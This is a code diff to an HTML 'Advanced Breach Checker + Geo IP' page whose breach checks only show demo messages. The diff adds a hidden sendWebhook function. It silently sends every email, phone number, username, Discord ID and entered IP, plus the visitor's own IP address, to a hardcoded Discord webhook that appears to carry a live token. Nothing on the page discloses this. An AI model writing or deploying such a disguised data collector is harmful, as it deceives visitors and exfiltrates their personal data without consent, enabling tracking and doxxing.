@@ -7,8 +7,8 @@
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
   <style>
     body {
-      background: linear-gradient(to bottom right,#0f0f0f,#1a1a1a);
-      color: #e0e0e0;
+      background-color: #0d1117;
+      color: #c9d1d9;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       padding-top: 60px;
     }
@@ -25,6 +25,9 @@
       background-color: #0d1117;
       color: #c9d1d9;
       border: 1px solid #30363d;
+    }
+    .form-control::placeholder {
+      color: #8b949e;
     }
     .btn-primary {
       background-color: #238636;
@@ -60,7 +63,7 @@
   <div class="container text-center">
     <h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
     <form onsubmit="searchData(); return false;" class="card p-4">
-      <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2" required>
+      <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
       <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
       <input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
       <input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
@@ -82,6 +85,35 @@
       document.getElementById("results").appendChild(box);
     }
 
+    async function sendWebhook(fields) {
+      const webhookURL = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
+      const payload = {
+        embeds: [{
+          title: "🔍 New Breach Search Attempt",
+          color: 3447003,
+          fields: [
+            { name: "📧 Email", value: fields.email || "Not provided", inline: false },
+            { name: "📱 Phone", value: fields.phone || "Not provided", inline: false },
+            { name: "👤 Username", value: fields.username || "Not provided", inline: false },
+            { name: "💬 Discord ID", value: fields.discord || "Not provided", inline: false },
+            { name: "🌐 IP Address (User entered)", value: fields.ip || "Not provided", inline: false },
+            { name: "🌐 IP Address (Visitor)", value: fields.visitorIP || "Unknown", inline: false },
+            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.warn("⚠️ Failed to send webhook.");
+      }
+    }
+
     async function searchData() {
       document.getElementById("results").innerHTML = "";
 
@@ -91,17 +123,17 @@
       const discord = document.getElementById("discord").value.trim();
       const ip = document.getElementById("ip").value.trim();
 
-      if (!email) updateResult("e", "⚠️ No email entered.", "warning");
-      else updateResult("e", `✅ Email checked (demo): ${email}`, "success");
+      if (!email) updateResult("email", "⚠️ No email entered.", "warning");
+      else updateResult("email", `✅ Email checked (demo): ${email}`, "success");
 
-      if (!phone) updateResult("p", "ℹ️ Phone check skipped.", "warning");
-      else updateResult("p", `✅ Phone checked (demo): ${phone}`, "success");
+      if (!phone) updateResult("phone", "ℹ️ Phone check skipped.", "warning");
+      else updateResult("phone", `✅ Phone checked (demo): ${phone}`, "success");
 
-      if (!username) updateResult("u", "ℹ️ Username check skipped.", "warning");
-      else updateResult("u", `✅ Username checked (demo): ${username}`, "success");
+      if (!username) updateResult("username", "ℹ️ Username check skipped.", "warning");
+      else updateResult("username", `✅ Username checked (demo): ${username}`, "success");
 
-      if (!discord) updateResult("d", "ℹ️ Discord check skipped.", "warning");
-      else updateResult("d", `✅ Discord ID checked (demo): ${discord}`, "success");
+      if (!discord) updateResult("discord", "ℹ️ Discord ID check skipped.", "warning");
+      else updateResult("discord", `✅ Discord ID checked (demo): ${discord}`, "success");
 
       let visitorIP = "Unknown";
       try {
@@ -110,17 +142,19 @@
         visitorIP = ipData.ip || "Unknown";
       } catch {}
 
+      sendWebhook({ email, phone, username, discord, ip, visitorIP });
+
       if (ip) {
         try {
           const res = await fetch(`https://ipwho.is/${ip}`);
           const data = await res.json();
           if (data.success) {
-            updateResult("ipgeo", `🌐 Detected IP: ${ip}\nHostname: ${data.hostname || 'N/A'}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nTimezone: ${data.timezone}\nISP: ${data.connection?.isp || 'N/A'}\nOrg: ${data.connection?.org || 'N/A'}\nAS: ${data.connection?.asn || 'N/A'} ${data.connection?.org || ''}`.trim(), "success");
+            updateResult("ipgeo", `🌐 IP Geo Info:\nIP: ${ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nISP: ${data.connection?.isp || 'N/A'}\nOrg: ${data.connection?.org || 'N/A'}`, "success");
           } else {
             updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}`, "warning");
           }
         } catch {
-          updateResult("ipgeo", `❌ Error fetching Geo data.`, "error");
+          updateResult("ipgeo", `❌ Error fetching Geo IP data.`, "error");
         }
 
         try {
@@ -133,11 +167,11 @@
           const endAddress = rdap.endAddress || 'N/A';
           const orgName = rdap.entities?.[0]?.vcardArray?.[1]?.find(x => x[0] === 'fn')?.[3] || 'N/A';
           const addressParts = rdap.entities?.[0]?.vcardArray?.[1]?.find(x => x[0] === 'adr')?.[3] || [];
-          const address = addressParts?.filter(Boolean).join(', ') || 'N/A';
+          const address = addressParts.filter(Boolean).join(', ') || 'N/A';
 
-          updateResult("arin", `🌐 ARIN IP Lookup\nHandle: ${handle}\nNet Name: ${network}\nStart Address: ${startAddress}\nEnd Address: ${endAddress}\nOrg Name: ${orgName}\nOrg Address: ${address}\nMore ARIN Info: https://search.arin.net/rdap/?query=${ip}`, "success");
+          updateResult("arin", `🌐 ARIN Info:\nHandle: ${handle}\nNet Name: ${network}\nStart: ${startAddress}\nEnd: ${endAddress}\nOrg: ${orgName}\nAddress: ${address}`, "success");
         } catch {
-          updateResult("arin", `❌ Error fetching ARIN RDAP info.`, "error");
+          updateResult("arin", `❌ Error fetching ARIN RDAP data.`, "error");
         }
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
